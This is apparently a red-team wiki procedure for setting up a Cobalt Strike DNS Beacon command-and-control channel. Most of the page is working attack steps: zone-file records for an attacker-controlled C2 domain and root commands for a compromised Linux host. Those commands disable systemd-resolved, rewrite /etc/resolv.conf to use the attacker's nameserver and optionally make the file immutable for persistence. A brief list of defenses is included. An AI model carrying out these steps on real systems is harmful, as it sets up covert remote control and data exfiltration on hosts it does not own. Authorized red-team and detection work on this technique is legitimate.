---
type: procedure
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - >-
    [[techniques/Standard Application Layer Protocol|T1071 - Standard
    Application Layer Protocol]]
sub_techniques:
  - '[[sub-techniques/DNS|T1071.004 - DNS]]'
tags:
  - '[[tags/Cobalt Strike]]'
  - '[[tags/DNS Beacon]]'
  - '[[tags/Payloads]]'
commands:
  - '[[commands/disable-systemd-resolved-and-update-resolv-conf]]'
tools:
  - '[[tools/Cobalt-Strike]]'
platforms:
  - Linux
skill_level: intermediate
impact_level: high
detection_risk: low
verified: true
validated: true
---

# Configure DNS for Cobalt Strike DNS Beacon

## Summary

This procedure outlines the configuration of DNS records on a controlled DNS server and updates the DNS resolver on a compromised Linux host to enable communication with a Cobalt Strike DNS Beacon payload. The DNS Beacon uses DNS queries for command and control (C2) to maintain persistence while evading traditional network defenses, as DNS traffic is often unmonitored and allowed outbound.

## Description

In a red team engagement, the DNS Beacon payload in Cobalt Strike allows operators to communicate with compromised hosts over DNS protocols, leveraging domain queries and responses to exfiltrate data and receive commands. This technique is particularly effective in environments with strict outbound filtering, as DNS is typically permitted. The procedure focuses on two key parts: (1) adding necessary NS and A records to a DNS zone file on the C2-controlled DNS server to establish the domain hierarchy for beaconing, and (2) configuring the target host's resolver to point to the attacker's DNS server, bypassing local resolution services like systemd-resolved. This setup assumes Cobalt Strike is configured with a DNS profile (e.g., using a custom malleable C2 profile for DNS). Success enables the beacon to poll for tasks via subdomains like polling.campaigns.example.com, reducing detection risk compared to HTTP/S C2.

## Requirements

1. Root or sudo access on the target Linux host (compromised system).
2. Administrative access to a DNS server (e.g., BIND on Linux) controlled by the attacker for hosting the C2 domains.
3. Cobalt Strike installed and licensed on the attacker's team server, with a DNS listener and profile configured.
4. Network connectivity allowing the target host to query the attacker's DNS server (UDP port 53 outbound).
5. Basic knowledge of DNS zone file editing and Cobalt Strike beacon generation.

## Defense

- Implement DNS sinkholing and monitoring with tools like Security Onion or Zeek to detect anomalous query patterns (e.g., high-volume subdomain queries).
- Enforce DNS over HTTPS (DoH) or TLS (DoT) to encrypt queries and prevent interception.
- Use EDR solutions to monitor for Cobalt Strike artifacts, such as unusual process spawning from beacons.
- Block known C2 domains via threat intelligence feeds and restrict resolver changes via group policy or immutable configurations.

## Objectives

1. Establish a stealthy C2 channel over DNS for persistent access to the compromised host.
2. Simulate adversary persistence techniques to test blue team detection capabilities.
3. Validate network segmentation by observing if DNS-based exfiltration succeeds.

## Instructions

### Step 1: Generate and Deploy the DNS Beacon Payload

**Context**: First, create the initial beacon payload using Cobalt Strike, which will be executed on the target host. This step assumes initial access has been gained (e.g., via phishing or exploit). The beacon is configured to use DNS for C2, pointing to your controlled domain (e.g., example.com).

Configure a DNS listener in Cobalt Strike: In the team server console, create a new listener of type 'DNS Beacon' with your domain and DNS server IP. Generate an executable or stageless payload for Linux.

Transfer and execute the payload on the target (e.g., via wget or existing shell). No specific command here, as delivery varies by initial access method.

**Expected Output**: Beacon connects back via DNS queries; check Cobalt Strike console for new session.

### Step 2: Configure DNS Zone Records on the C2 DNS Server

**Context**: Edit the DNS zone file for your C2 domain to include records that support the beacon's communication. This creates a hierarchy where the beacon queries subdomains for commands, and responses are encoded in DNS replies. Use the provided code snippet to add these entries.

**Code** ([[codes/dns-zone-file-entries-for-cobalt-strike-beacon]]):

```text
NS  example.com directs to 10.10.10.10. 86400
NS  polling.campaigns.example.com directs to campaigns.example.com. 3600
A campaigns.example.com directs to 10.10.10.10 3600
```

> Append these lines to your zone file (e.g., /etc/bind/db.example.com). Replace 'example.com' with your domain and '10.10.10.10' with your DNS server IP. The NS records delegate authority, and the A record points to the C2 resolver. After editing, validate with `named-checkzone example.com /etc/bind/db.example.com` and reload BIND with `rndc reload example.com`.

**Expected Output**: DNS server logs confirm zone reload without errors; test resolution with `dig @10.10.10.10 campaigns.example.com` showing the correct IP.

### Step 3: Update DNS Resolver on the Compromised Host

**Context**: On the target Linux host, disable the default systemd-resolved service to prevent conflicts and manually set the nameserver to your C2 DNS server. This ensures all DNS queries from the beacon route through your controlled infrastructure.

**Command** ([[commands/disable-systemd-resolved-and-update-resolv-conf]]):
```bash
systemctl disable systemd-resolved
systemctl stop systemd-resolved
rm /etc/resolv.conf
echo "nameserver 10.10.10.10" > /etc/resolv.conf
echo "nameserver 8.8.8.8" >> /etc/resolv.conf
```

> This disables and stops systemd-resolved, removes the managed resolv.conf, and creates a new one pointing primarily to your DNS server (10.10.10.10), with Google DNS as fallback. Adjust IPs as needed. Make the file immutable if persistence is required: `chattr +i /etc/resolv.conf`.

**Expected Output**: `cat /etc/resolv.conf` shows the new nameservers; `systemctl status systemd-resolved` confirms it's inactive. Test with `nslookup example.com` resolving via your server.

### Step 4: Verify Beacon Communication

**Context**: Interact with the beacon in Cobalt Strike to confirm DNS C2 is active. Issue a simple task like directory listing and observe DNS traffic.

In the Cobalt Strike console, select the beacon session and run `ls`. Monitor network traffic (e.g., with tcpdump) for DNS queries to subdomains under your domain.

**Expected Output**: Beacon responds with output in the console; Wireshark or logs show encoded DNS queries/responses without errors.

**Success Indicators**:
- Cobalt Strike shows active beacon session.
- DNS queries from target hit your server (confirm via server logs).
- No resolution failures or fallback to public DNS.
